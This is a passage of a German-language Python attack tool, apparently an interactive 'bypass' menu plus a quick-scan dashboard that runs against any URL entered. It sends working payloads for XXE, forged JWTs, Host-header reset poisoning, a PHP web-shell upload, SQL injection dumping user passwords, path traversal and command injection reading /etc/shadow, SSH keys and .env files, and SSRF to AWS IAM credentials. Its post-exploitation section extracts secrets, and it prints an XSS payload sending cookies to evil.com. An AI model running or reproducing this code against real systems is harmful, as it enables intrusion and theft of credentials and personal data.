                       base+"/import",base+"/xmlrpc.php",base+"/api/xml"]
            for ep in xml_eps:
                for pay in BYPASS_PAYLOADS["xxe"]:
                    c2,_,b2,_ = _req(ep,"POST",pay,
                                      hdrs={"Content-Type":"application/xml","Accept":"*/*"})
                    b2l = b2.lower()
                    hit = any(x in b2 for x in ["root:x:","ami-id","daemon:","localhost"]) \
                          and "<html" not in b2l[:100]
                    icon = f"{BRED}[GELESEN!]{R}" if hit else f"{DIM}[miss    ]{R}"
                    snip = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                    ep_short = ep.replace(base,"")
                    print(f"  {icon}  {DIM}{ep_short:<15} {pay[:30]}{R}  {GRN if hit else DIM}{snip}{R}")
                    time.sleep(0.07)

        elif "directory listing" in nl or "dirlist" in nl or "verzeichnis" in nl or "exposed dirs" in nl:
            print(f"  {DIM}Teste Directory Listing — offene Verzeichnisse ...{R}\n")
            for path in BYPASS_PAYLOADS["dirlist"]:
                c2,_,b2,_ = _req(base+path)
                b2l = b2.lower()
                is_listing = c2==200 and ("index of" in b2l or "parent directory" in b2l or
                             ("<a href=" in b2l and "size" in b2l))
                icon = f"{BRED}[OFFEN!]{R}" if is_listing else f"{DIM}[  -- ]{R}"
                files = re.findall(r'<a href="([^"?#]+)"', b2)[:5] if is_listing else []
                snip  = ", ".join(files) if files else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{path:<20}{R}  {GRN if is_listing else DIM}{snip}{R}")
                time.sleep(0.05)

        elif "jwt" in nl:
            print(f"  {DIM}Teste JWT Bypass — alg:none + schwaches Secret ...{R}\n")
            import base64 as _b64
            # Hole Token
            cx,hx,bx,_ = _req(login_url,"POST",{"username":"admin","password":"admin"})
            toks = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', str(hx)+bx)
            if toks:
                tok = toks[0]
                print(f"  {YEL}[TOKEN]{R}  {DIM}{tok[:60]}...{R}\n")
                for alg, label in [("none","alg:none"),("HS256","HS256 leer")]:
                    try:
                        hdr_b = _b64.urlsafe_b64encode(f'{{"alg":"{alg}","typ":"JWT"}}'.encode()).rstrip(b"=").decode()
                        pay_b = _b64.urlsafe_b64encode(b'{"sub":"admin","role":"admin","admin":true,"iat":1}').rstrip(b"=").decode()
                        sig   = "" if alg=="none" else _b64.urlsafe_b64encode(b"x"*32).rstrip(b"=").decode()
                        forged= f"{hdr_b}.{pay_b}.{sig}"
                        c2,_,b2,_ = _req(base, hdrs={"Authorization":f"Bearer {forged}","Cookie":f"token={forged}"})
                        hit = c2==200 and any(x in b2.lower() for x in ["admin","dashboard","panel","welcome"])
                        icon = f"{BRED}[BYPASS!]{R}" if hit else f"{DIM}[miss   ]{R}"
                        print(f"  {icon}  {DIM}{label:<20}{R}  HTTP {c2}  {GRN if hit else DIM}{b2[:30].replace(chr(10),' ')}{R}")
                    except Exception as e:
                        print(f"  {DIM}[err] {label}: {e}{R}")
                    time.sleep(0.1)
            else:
                print(f"  {DIM}Kein JWT-Token im Login-Response gefunden.{R}")
                print(f"  {DIM}Token manuell in Cookie/Header einsetzen.{R}")

        elif "host header" in nl or "host inject" in nl or "reset poison" in nl:
            print(f"  {DIM}Teste Host Header Injection — Passwort-Reset-Poisoning ...{R}\n")
            evil = "evil-attacker.com"
            for ep in BYPASS_PAYLOADS["host_inject"]:
                c2,_,b2,_ = _req(base+ep,"POST",{"email":"test@example.com"},
                                   hdrs={"Host":evil,"Content-Type":"application/x-www-form-urlencoded"})
                b2l = b2.lower()
                hit = c2 in (200,201,202) and any(x in b2l for x in ["sent","success","reset","email","check"])
                icon = f"{BRED}[ANFÄLLIG!]{R}" if hit else f"{DIM}[  miss  ]{R}"
                snip = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{ep:<25}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.08)

        elif "file upload" in nl or "upload bypass" in nl:
            print(f"  {DIM}Teste File Upload Bypass — PHP-Shell via Extension-Tricks ...{R}\n")
            eps = ["/upload","/api/upload","/file/upload","/media/upload","/avatar","/profile/picture"]
            names= ["shell.php","shell.php5","shell.phtml","shell.php.jpg","shell.PhP","shell.php%00.jpg"]
            shell= b"<?php echo shell_exec($_GET['c']); ?>"
            for ep in eps:
                for fname in names:
                    bnd = "----FormBoundary7MA4YWx"
                    body= (f"--{bnd}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\n"
                           f"Content-Type: image/jpeg\r\n\r\n").encode()+shell+f"\r\n--{bnd}--\r\n".encode()
                    c2,_,b2,_ = _req(base+ep,"POST",body,hdrs={"Content-Type":f"multipart/form-data; boundary={bnd}"})
                    b2l = b2.lower()
                    hit = c2 in (200,201) and any(x in b2l for x in ["success","uploaded","url","path","ok"])
                    icon = f"{BRED}[UPLOAD!]{R}" if hit else f"{DIM}[miss   ]{R}"
                    snip = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                    print(f"  {icon}  {DIM}{ep:<18} {fname:<22}{R}  {GRN if hit else DIM}{snip}{R}")
                    time.sleep(0.06)

        elif "crlf" in nl:
            print(f"  {DIM}Teste CRLF Injection — Header-Splitting ...{R}\n")
            for pay in BYPASS_PAYLOADS["crlf"]:
                for param in ["?q=","?url=","?redirect=","?next="]:
                    c2,h2,b2,_ = _req(f"{base}/{param}{pay}")
                    hit = "X-Injected" in str(h2) or "injected" in str(h2).lower()
                    icon = f"{BRED}[INJECT!]{R}" if hit else f"{DIM}[miss   ]{R}"
                    print(f"  {icon}  {DIM}{param}{pay[:35]:<38}{R}  {GRN if hit else DIM}HTTP {c2}{R}")
                    time.sleep(0.07)

        elif "graphql" in nl or "introspection" in nl:
            print(f"  {DIM}Teste GraphQL Introspection — API-Schema auslesen ...{R}\n")
            eps = ["/graphql","/api/graphql","/gql","/api/gql","/v1/graphql","/query"]
            for ep in eps:
                for q in BYPASS_PAYLOADS["gql"]:
                    c2,_,b2,_ = _req(base+ep,"POST",q,hdrs={"Content-Type":"application/json"})
                    hit = c2==200 and ("__schema" in b2 or "__typename" in b2)
                    icon = f"{BRED}[OFFEN! ]{R}" if hit else f"{DIM}[miss   ]{R}"
                    snip = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                    print(f"  {icon}  {DIM}{ep:<18} {q[:25]}{R}  {GRN if hit else DIM}{snip}{R}")
                    if hit:
                        types = re.findall(r'"name"\s*:\s*"([A-Za-z][^"]+)"', b2)
                        print(f"  {YEL}  Typen gefunden: {', '.join(set(types[:8]))}{R}")
                    time.sleep(0.07)

        elif "mass assignment" in nl or "mass" in nl:
            print(f"  {DIM}Teste Mass Assignment — versteckte JSON-Felder ...{R}\n")
            eps = ["/api/user","/api/profile","/api/me","/api/register","/api/update","/profile/update"]
            for ep in eps:
                for pay in BYPASS_PAYLOADS["mass"]:
                    c2,_,b2,_ = _req(base+ep,"POST",pay,hdrs={"Content-Type":"application/json"})
                    b2l = b2.lower()
                    hit = c2 in (200,201) and any(x in b2l for x in ["admin","true","success","role"])
                    icon = f"{BRED}[AKZEPT.]{R}" if hit else f"{DIM}[miss   ]{R}"
                    snip = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                    print(f"  {icon}  {DIM}{ep:<20} {pay[:28]}{R}  {GRN if hit else DIM}{snip}{R}")
                    time.sleep(0.07)

        elif "path normalization" in nl or "path bypass" in nl or "normali" in nl:
            print(f"  {DIM}Teste Path Normalization Bypass — URL-Encoding-Tricks ...{R}\n")
            for path in BYPASS_PAYLOADS["path_bypass"]:
                c2,_,b2,_ = _req(base+path)
                b2l = b2.lower()
                hit = c2==200 and any(x in b2l for x in ["admin","dashboard","panel","management"]) \
                      and "<html" not in b2l[:50]
                icon = f"{BRED}[BYPASS!]{R}" if hit else f"{DIM}[miss   ]{R}"
                snip = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{path:<30}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.06)

        elif "sensitive" in nl and "js" in nl:
            print(f"  {DIM}Suche API-Keys und Secrets in JS-Dateien ...{R}\n")
            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body0, re.IGNORECASE)
            js_urls = [(u if u.startswith("http") else base+"/"+u.lstrip("/")) for u in js_urls[:10]]
            for u in [base+"/static/js/main.js", base+"/assets/app.js", base+"/js/app.js"]:
                if u not in js_urls: js_urls.append(u)
            patterns = [
                (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', "API Key"),
                (r'(?:secret|password)\s*[=:]\s*["\']([^"\']{8,})["\']', "Secret"),
                (r'(?:token|access_token)\s*[=:]\s*["\']([A-Za-z0-9_.\-]{20,})["\']', "Token"),
                (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
                (r'AKIA[A-Z0-9]{16}', "AWS Access Key"),
                (r'(?:mongodb|postgres|mysql)://[^\s"\'<]+', "DB String"),
            ]
            for js_url in js_urls:
                c2,_,b2,_ = _req(js_url, timeout=4)
                if c2 != 200: continue
                print(f"  {DIM}[JS] {js_url.replace(base,'')[:40]}{R}")
                for pat, label in patterns:
                    hits = re.findall(pat, b2, re.IGNORECASE)
                    for h in hits[:2]:
                        val = h if isinstance(h,str) else h[0]
                        if len(val) > 5:
                            print(f"  {BRED}  🔑 {label}: {val[:60]}{R}")
                time.sleep(0.05)

        else:
            # Generischer Test — zeigt echte Request/Response Details
            print(f"  {DIM}Live Request gegen Ziel:{R}\n")
            c2,h2,b2,u2 = _req(base)
            print(f"  {DIM}URL:{R}      {base}")
            print(f"  {DIM}Status:{R}   HTTP {c2}")
            print(f"  {DIM}Redirect:{R} {u2 if u2 != base else 'kein'}")
            print(f"\n  {DIM}Response Headers:{R}")
            for k,v in list(h2.items())[:8]:
                icon = GRN if k.lower() in ("strict-transport-security","content-security-policy",
                                             "x-frame-options","x-content-type-options") else DIM
                print(f"  {icon}  {k}: {v[:55]}{R}")
            print(f"\n  {YEL}Empfehlung:{R}  {fix}")
            hit_found = (name.lower() in detail.lower() or detail == "fehlt")

        print(f"\n  {DIM}{'─'*W}{R}")
        if hit_found:
            print(f"  {BRED}⚠ BYPASS BESTÄTIGT!{R}  {GRN}Fix: {DIM}{fix}{R}")
            # ── Daten extrahieren die geklaut werden könnten ──
            print(f"\n  {BRED}═══ WAS EIN ANGREIFER JETZT SEHEN KANN ═══{R}\n")
            nl2 = nl

            if "sql" in nl2:
                # Versuche Daten zu lesen
                extract_pays = [
                    ("?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--",
                     "Tabellennamen"),
                    ("?id=1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",
                     "Spalten der users-Tabelle"),
                    ("?id=1 UNION SELECT username,password,3 FROM users--",
                     "Benutzernamen + Passwörter"),
                    ("?id=1 UNION SELECT user(),database(),3--",
                     "DB-User + Datenbankname"),
                    ("?id=1 UNION SELECT @@version,2,3--",
                     "Datenbank-Version"),
                ]
                for pay, label in extract_pays:
                    _,_,b2,_ = _req(f"{base}/{pay}")
                    # Suche nach Daten in Response
                    lines_out = [l.strip() for l in b2.split("\n") if l.strip() and len(l.strip()) > 3]
                    data_lines = [l for l in lines_out if not any(x in l.lower() for x in
                                  ["<!","<html","<head","<body","<div","<script","css","javascript"])]
                    if data_lines:
                        print(f"  {YEL}[{label}]{R}")
                        for dl in data_lines[:6]:
                            print(f"  {RED}  → {dl[:70]}{R}")
                    time.sleep(0.1)

            elif "lfi" in nl2 or "path" in nl2 or "traversal" in nl2:
                # Wichtige Dateien lesen
                read_files = [
                    ("../../../etc/passwd",               "Benutzerkonten (/etc/passwd)"),
                    ("../../../etc/shadow",               "Gehashte Passwörter (/etc/shadow)"),
                    ("../../../etc/hosts",                "Hosts-Datei"),
                    ("../../../proc/version",             "Linux Kernel Version"),
                    ("../../../var/www/html/.env",        ".env Datei"),
                    ("../../../var/www/html/config.php",  "config.php"),
                    ("../../../home/.ssh/id_rsa",         "SSH Private Key"),
                    ("../../../windows/win.ini",          "Windows win.ini"),
                    ("../../../windows/system32/drivers/etc/hosts", "Windows Hosts"),
                ]
                for pay, label in read_files:
                    _,_,b2,_ = _req(f"{base}/?file={pay}")
                    b2l = b2.lower()
                    is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                    is_cf   = any(x in b2l for x in ["just a moment","cloudflare","ray id"])
                    is_real = any(x in b2 for x in ["root:x:","[fonts]","localhost","BEGIN RSA",
                                                     "DB_","password","kernel","WINDOWS VERSION"])
                    if is_cf or is_html:
                        print(f"  {DIM}[geblockt] {label:<40}  WAF/HTML{R}")
                    elif is_real:
                        print(f"  {BRED}[GELESEN!] {label}{R}")
                        for line in b2.splitlines()[:15]:
                            ls = line.strip()
                            if ls and not ls.startswith("#") and len(ls) > 3 and "<" not in ls:
                                if any(x in ls.lower() for x in ["password","secret","key","token","pass="]):
                                    print(f"  {RED}  🔑 {ls[:80]}{R}")
                                else:
                                    print(f"  {YEL}     {ls[:80]}{R}")
                    else:
                        print(f"  {DIM}[miss]     {label:<40}  kein Inhalt{R}")
                    time.sleep(0.08)

            elif "ssrf" in nl2:
                # AWS Metadaten und interne Dienste auslesen
                ssrf_extract = [
                    ("http://169.254.169.254/latest/meta-data/",          "AWS Metadaten Index"),
                    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials"),
                    ("http://169.254.169.254/latest/user-data",           "AWS User-Data (oft Passwörter)"),
                    ("http://169.254.169.254/latest/meta-data/hostname",  "AWS Hostname"),
                    ("http://169.254.169.254/latest/meta-data/public-ipv4","AWS Public IP"),
                    ("http://127.0.0.1:8080/",                           "Interner Port 8080"),
                    ("http://127.0.0.1:3000/",                           "Interner Port 3000"),
                    ("http://127.0.0.1:8888/",                           "Jupyter Notebook?"),
                ]
                # Baseline: normale Response ohne SSRF-Payload
                _,_,b_base,_ = _req(f"{base}/?url=http://example.com/")
                base_len = len(b_base)

                for pay, label in ssrf_extract:
                    _,_,b2,_ = _req(f"{base}/?url={urllib.parse.quote(pay,safe='')}")
                    b2l = b2.lower()
                    # Echter SSRF-Treffer nur wenn:
                    # 1. Kein HTML/Cloudflare/WAF in Response
                    # 2. Enthält echte AWS/interne Daten
                    # 3. Response unterscheidet sich deutlich von Baseline
                    is_html   = b2l.strip().startswith("<!doctype") or "<html" in b2l[:200]
                    is_cf     = any(x in b2l for x in ["just a moment","cloudflare","ray id","checking your"])
                    is_waf    = any(x in b2l for x in ["access denied","forbidden","blocked","firewall"])
                    has_data  = any(x in b2 for x in ["ami-id","instance-id","iam","security-credential",
                                                        "root:x:","redis_version","ssh-rsa","BEGIN RSA",
                                                        "jupyter","kernel_id"])
                    diff_resp = abs(len(b2) - base_len) > 200 and not is_html

                    if is_cf or is_waf:
                        print(f"  {DIM}[WAF/CF]  {label:<35}  Cloudflare blockiert{R}")
                    elif is_html and not has_data:
                        print(f"  {DIM}[HTML]    {label:<35}  Nur HTML-Seite zurück{R}")
                    elif has_data or diff_resp:
                        print(f"  {BRED}[ZUGÄNGLICH] {label}{R}")
                        for line in b2.splitlines()[:8]:
                            ls = line.strip()
                            if ls and not ls.startswith("<") and len(ls) > 2:
                                if any(x in ls.lower() for x in ["secret","key","token","password","access","cred"]):
                                    print(f"  {RED}  🔑 {ls[:80]}{R}")
                                else:
                                    print(f"  {YEL}     {ls[:70]}{R}")
                    else:
                        print(f"  {DIM}[miss]    {label:<35}  HTTP {len(b2)}b — kein Inhalt{R}")
                    time.sleep(0.1)

            elif "cmd" in nl2 or "command" in nl2:
                # System-Infos und sensitive Daten lesen
                cmd_extract = [
                    ("; id",                         "Aktueller Benutzer"),
                    ("; whoami",                     "Benutzername"),
                    ("; uname -a",                   "System-Info"),
                    ("; cat /etc/passwd",            "Benutzerkonten"),
                    ("; cat /etc/hosts",             "Hosts-Datei"),
                    ("; env",                        "Umgebungsvariablen (Passwörter!)"),
                    ("; cat ~/.ssh/id_rsa",          "SSH Private Key"),
                    ("; ls /var/www/html/",          "Web-Root Dateien"),
                    ("; cat /var/www/html/.env",     ".env Datei"),
                    ("; ps aux",                     "Laufende Prozesse"),
                    ("; netstat -an",                "Offene Ports intern"),
                    ("; cat /proc/version",          "Kernel Version"),
                ]
                for pay, label in cmd_extract:
                    _,_,b2,_ = _req(f"{base}/?cmd={urllib.parse.quote(pay,safe='')}")
                    b2l = b2.lower()
                    is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                    is_cf   = any(x in b2l for x in ["just a moment","cloudflare","ray id"])
                    is_real = any(x in b2 for x in ["uid=","root:","linux","passwd",
                                                     "BEGIN RSA","DB_","PATH=","tcp ","www-data"])
                    if is_cf or is_html:
                        print(f"  {DIM}[geblockt] {label:<35}  WAF/CF blockiert{R}")
                    elif is_real:
                        print(f"  {BRED}[AUSGABE!] {label}{R}")
                        for line in b2.splitlines()[:10]:
                            ls = line.strip()
                            if ls and len(ls) > 2 and "<" not in ls:
                                if any(x in ls.lower() for x in ["password","secret","key","token","db_"]):
                                    print(f"  {RED}  🔑 {ls[:80]}{R}")
                                else:
                                    print(f"  {YEL}     {ls[:80]}{R}")
                    else:
                        print(f"  {DIM}[miss]     {label:<35}  kein Output{R}")
                    time.sleep(0.1)

            elif ".env" in nl2 or "exposed" in nl2 or "git" in nl2 or "datei" in nl2:
                # Sensitive Dateien komplett auslesen
                for path in ["/.env","/.env.local","/.git/config",
                             "/config.php.bak","/wp-config.php.bak","/.htpasswd"]:
                    _,_,b2,_ = _req(base+path)
                    if len(b2) > 20:
                        sens = [l.strip() for l in b2.splitlines()
                                if any(x in l.upper() for x in
                                ["PASSWORD","SECRET","KEY","TOKEN","DB_","API_","DATABASE","PASS","HASH"])]
                        if sens:
                            print(f"  {BRED}[{path}]{R}")
                            for s in sens[:10]:
                                print(f"  {RED}  🔑 {s[:80]}{R}")
                    time.sleep(0.06)

            elif "cors" in nl2:
                print(f"  {DIM}Mit CORS-Bypass kann ein Script von evil.com:{R}")
                # Zeige was die API zurückgibt
                api_paths = ["/api/user","/api/profile","/api/me","/user","/profile","/account"]
                for path in api_paths:
                    c2,_,b2,_ = _req(base+path, hdrs={"Origin":"https://evil.com"})
                    if c2==200 and len(b2) > 20:
                        print(f"  {BRED}[LESBAR von evil.com] {path}{R}")
                        # JSON-Felder herausfiltern
                        fields = re.findall(r'"(email|username|name|token|id|role|password)["\s]*:\s*"?([^",\n]{1,40})', b2, re.IGNORECASE)
                        for key, val in fields[:8]:
                            print(f"  {RED}  🔑 {key}: {val}{R}")
                        if not fields:
                            print(f"  {YEL}     {b2[:100].replace(chr(10),' ')}{R}")
                    time.sleep(0.08)

            elif "idor" in nl2 or "insecure direct" in nl2 or "fremddaten" in nl2:
                print(f"  {DIM}Was ein Angreifer durch ID-Enumeration findet:{R}\n")
                for param, ids in [("?id=", range(1,11)),("?user=", range(1,6)),
                                    ("?order=", range(1,6)),("?invoice=", range(1,4))]:
                    for id_val in ids:
                        c2,_,b2,_ = _req(f"{base}/{param}{id_val}")
                        b2l = b2.lower()
                        if c2==200 and not b2l.strip().startswith("<!doctype"):
                            fields = re.findall(r'"?(email|name|username|user|address|phone|cc|card|ssn|dob)["\s]*[=:]\s*["\']?([^"\'<\n,]{4,40})', b2, re.IGNORECASE)
                            if fields:
                                print(f"  {BRED}{param}{id_val} → Fremddaten:{R}")
                                for k,v in fields[:5]: print(f"  {RED}  🔑 {k}: {v}{R}")
                        time.sleep(0.06)

            elif "ssti" in nl2 or "template" in nl2:
                print(f"  {DIM}SSTI Eskalation — was kann ausgelesen werden:{R}\n")
                escalate = [
                    ("{{config}}",              "?name=",    "Django/Flask Config"),
                    ("{{config.items()}}",       "?q=",       "Alle Config-Werte"),
                    ("{{request.environ}}",      "?name=",    "Server Umgebungsvariablen"),
                    ('{{"".__class__.__mro__}}', "?name=",    "Python Class-Chain"),
                    ("${T(java.lang.System).getenv()}", "?q=","Java Umgebungsvariablen"),
                ]
                for pay, param, label in escalate:
                    _,_,b2,_ = _req(f"{base}/{param}{urllib.parse.quote(pay,safe='')}")
                    b2l = b2.lower()
                    is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                    if not is_html and len(b2) > 50:
                        has_sensitive = any(x in b2l for x in ["secret","key","password","token","database"])
                        icon = BRED+"[KRITISCH!]"+R if has_sensitive else YEL+"[AUSGABE  ]"+R
                        print(f"  {icon}  {label}")
                        for line in b2.splitlines()[:6]:
                            ls = line.strip()
                            if ls and "<" not in ls and len(ls) > 3:
                                if any(x in ls.lower() for x in ["secret","key","password","token"]):
                                    print(f"  {RED}  🔑 {ls[:80]}{R}")
                                else:
                                    print(f"  {YEL}     {ls[:70]}{R}")
                    time.sleep(0.08)

            elif "tamper" in nl2 or "parameter" in nl2 or "privilege" in nl2:
                print(f"  {DIM}Was durch Privilege-Escalation zugänglich wird:{R}\n")
                admin_paths = ["/admin","/admin/users","/admin/panel","/admin/config",
                               "/api/admin","/api/users","/api/config","/dashboard/admin"]
                for path in admin_paths:
                    for data in [{"isAdmin":"true"},{"role":"admin"},{"admin":"1"}]:
                        c2,_,b2,_ = _req(base+path,"POST",data)
                        b2l = b2.lower()
                        if c2==200 and not b2l.strip().startswith("<!doctype"):
                            fields = re.findall(r'"?(email|name|user|password|secret|token|key)["\s]*[=:]\s*["\']?([^"\'<\n,]{4,60})', b2, re.IGNORECASE)
                            if fields:
                                print(f"  {BRED}{path} → Admin-Daten:{R}")
                                for k,v in fields[:5]: print(f"  {RED}  🔑 {k}: {v}{R}")
                    time.sleep(0.06)

            elif "nosql" in nl2:
                print(f"  {DIM}NoSQL-Bypass — was aus der DB lesbar ist:{R}\n")
                nosql_extract = [
                    ('{"$gt":""}',   "?username=",  "Alle Benutzer"),
                    ('{"$regex":".*"}', "?q=",      "Alle Datensätze"),
                    ('{"$ne":"__invalid__"}', "?user=", "Not-Equal-Bypass"),
                ]
                for pay, param, label in nosql_extract:
                    _,_,b2,_ = _req(f"{base}/{param}{urllib.parse.quote(pay,safe='')}")
                    b2l = b2.lower()
                    is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                    if not is_html and len(b2) > 30:
                        users = re.findall(r'"?(email|username|name|_id)["\s]*[=:]\s*["\']?([^"\'<\n,]{2,50})', b2, re.IGNORECASE)
                        if users:
                            print(f"  {BRED}[{label}] Daten zugänglich:{R}")
                            for k,v in users[:6]: print(f"  {RED}  🔑 {k}: {v}{R}")
                    time.sleep(0.07)

            elif "xxe" in nl2 or "xml" in nl2 or "external entity" in nl2:
                print(f"  {DIM}XXE — welche Dateien/Dienste erreichbar sind:{R}\n")
                xxe_extract = [
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>',
                     "Linux /etc/passwd"),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/shadow">]><foo>&x;</foo>',
                     "Linux /etc/shadow"),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/hosts">]><foo>&x;</foo>',
                     "Hosts-Datei"),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&x;</foo>',
                     "AWS Metadaten"),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///var/www/html/.env">]><foo>&x;</foo>',
                     ".env Datei"),
                ]
                xml_eps = [base+"/",base+"/api/",base+"/upload",base+"/xmlrpc.php",base+"/api/xml"]
                for pay, label in xxe_extract:
                    for ep in xml_eps[:3]:
                        _,_,b2,_ = _req(ep,"POST",pay,hdrs={"Content-Type":"application/xml"})
                        b2l = b2.lower()
                        is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                        has_real = any(x in b2 for x in ["root:x:","daemon:","ami-id","DB_","localhost","BEGIN RSA"])
                        if not is_html and has_real:
                            print(f"  {BRED}[GELESEN!] {label}{R}")
                            for line in b2.splitlines()[:8]:
                                ls = line.strip()
                                if ls and "<" not in ls and len(ls) > 3:
                                    print(f"  {RED}  → {ls[:80]}{R}")
                            break
                    time.sleep(0.08)

            elif "directory listing" in nl2 or "verzeichnis" in nl2 or "dirlist" in nl2 or "exposed dirs" in nl2:
                print(f"  {DIM}Directory Listing — was in offenen Verzeichnissen liegt:{R}\n")
                for path in BYPASS_PAYLOADS["dirlist"]:
                    c2,_,b2,_ = _req(base+path)
                    b2l = b2.lower()
                    is_listing = c2==200 and ("index of" in b2l or "parent directory" in b2l)
                    if is_listing:
                        files = re.findall(r'<a href="([^"?#][^"]*)"', b2)
                        print(f"  {BRED}[OFFEN] {path}{R}")
                        dangerous = [f for f in files if any(x in f.lower() for x in
                                      [".sql",".bak",".zip",".env",".key",".pem",".php","config","backup","password","secret"])]
                        for f in (dangerous or files)[:8]:
                            icon = RED+"  🔑" if dangerous else YEL+"    "
                            print(f"  {icon} {f}{R}")
                    time.sleep(0.06)

            elif "cookie" in nl2 or "httponly" in nl2:
                c2,h2,_,_ = _req(base)
                ck = h2.get("Set-Cookie","")
                if ck:
                    print(f"  {BRED}Cookie ohne HttpOnly — per XSS lesbar:{R}")
                    print(f"  {RED}  document.cookie → {ck[:80]}{R}")
                    print(f"\n  {DIM}XSS-Payload um Cookie zu stehlen:{R}")
                    print(f"  {YEL}  <script>new Image().src='http://evil.com/?c='+btoa(document.cookie)</script>{R}")

            elif "hsts" in nl2 or "https" in nl2 or "ssl" in nl2:
                print(f"  {DIM}Bei HTTP-Verbindung sichtbar für Angreifer im WLAN:{R}")
                http_url = base.replace("https://","http://")
                _,_,b2,_ = _req(http_url)
                # Suche nach Formularen + Input-Feldern
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', b2, re.IGNORECASE)
                forms  = re.findall(r'<form[^>]+action=["\']([^"\']*)["\']', b2, re.IGNORECASE)
                if inputs:
                    print(f"  {RED}  Formularfelder die im Klartext übertragen werden:{R}")
                    for inp_name in inputs[:8]:
                        print(f"  {YEL}    → {inp_name}{R}")
                if forms:
                    print(f"  {RED}  Formular-Ziele:{R}")
                    for f in forms[:4]:
                        print(f"  {YEL}    → {f}{R}")

            else:
                # Allgemein — zeige interessante Response-Daten
                _,_,b2,_ = _req(base)
                emails  = re.findall(r'[\w.+-]+@[\w-]+\.[a-z]{2,}', b2)
                phones  = re.findall(r'[\+\(]?[0-9]{2,4}[\s\-\.]?[0-9]{3,5}[\s\-\.]?[0-9]{4,6}', b2)
                tokens  = re.findall(r'(?:token|api_key|secret|password)["\s:=]+(["\']?)([a-zA-Z0-9_\-]{16,})\1', b2, re.IGNORECASE)
                if emails:
                    print(f"  {BRED}E-Mail-Adressen gefunden:{R}")
                    for e in set(emails[:6]): print(f"  {RED}  → {e}{R}")
                if tokens:
                    print(f"  {BRED}Mögliche Tokens/Keys gefunden:{R}")
                    for _,t in tokens[:4]: print(f"  {RED}  🔑 {t}{R}")
                if not emails and not tokens:
                    print(f"  {DIM}Keine direkten Daten extrahierbar — manueller Check empfohlen.{R}")

        input(f"\n  {DG}ENTER = zurück zur Liste{R} ")

    # ── Interaktives Bypass-Menü ──────────────────────────
    while True:
        clear(); print(BANNER)
        print(f"\n  {BRED}BYPASS DIREKT TESTEN{R}  {DIM}— {base}{R}\n")
        print(f"  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}  {YEL}Schwachstelle auswählen und live testen:{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        for i,(sev,kat,name,detail,erkl,fix) in enumerate(exploitable,1):
            lbl = f"{BRED}[KRIT]{R}" if sev==3 else f"{RED}[HOCH]{R}"
            print(f"  {DG}║{R}  {BLU}[{i:>2}]{R}  {lbl}  {YEL}{name:<28}{R}  {DIM}{detail[:22]}{R}")
        print(f"  {DG}║{R}  {DIM}[ 0]  Beenden{R}")
        print(f"  {DG}╚{'═'*W}╝{R}")
        ch = input(f"\n  {DG}►{R} ").strip()
        if ch == "0" or not ch: break
        if ch.isdigit() and 1 <= int(ch) <= len(exploitable):
            _run_bypass(*exploitable[int(ch)-1])
    wait()


# ── 104  SECURITY DASHBOARD ──────────────────────────────────
def security_dashboard():
    RED   = "\033[91m"; BRED = "\033[1;91m"
    GRN   = "\033[92m"; YEL  = "\033[93m"
    BLU   = "\033[96m"; DIM2 = "\033[2m"
    hdr("SECURITY DASHBOARD — QUICK SCAN")
    print(f"  {DIM}Schnelle Übersicht in ~30 Sekunden. Wie bei echten Pentest-Tools.{R}\n")
    base = inp("Ziel-URL (z.B. https://example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "http://" + base
    base = base.rstrip("/")

    clear()
    # ── Live-Scan Anzeige ─────────────────────────────────
    W = 74
    checks = {}   # name → (status, detail)  status: 0=OK 1=WARN 2=VULN 3=CRIT

    def _req(url, method="GET", data=None, hdrs=None, timeout=5):
        h = {"User-Agent":"Mozilla/5.0"}
        if hdrs: h.update(hdrs)
        try:
            bd = urllib.parse.urlencode(data).encode() if isinstance(data,dict) else (data.encode() if isinstance(data,str) else data)
            req = urllib.request.Request(url, data=bd, method=method, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, dict(r.headers), r.read(16384).decode(errors="ignore"), r.url
        except urllib.error.HTTPError as e:
            try: b = e.read(4096).decode(errors="ignore")
            except: b = ""
            return e.code, dict(e.headers), b, url
        except Exception as ex:
            return 0, {}, str(ex), url

    def _draw(scanning=""):
        clear()
        print(BANNER)
        now = datetime.now().strftime("%H:%M:%S")
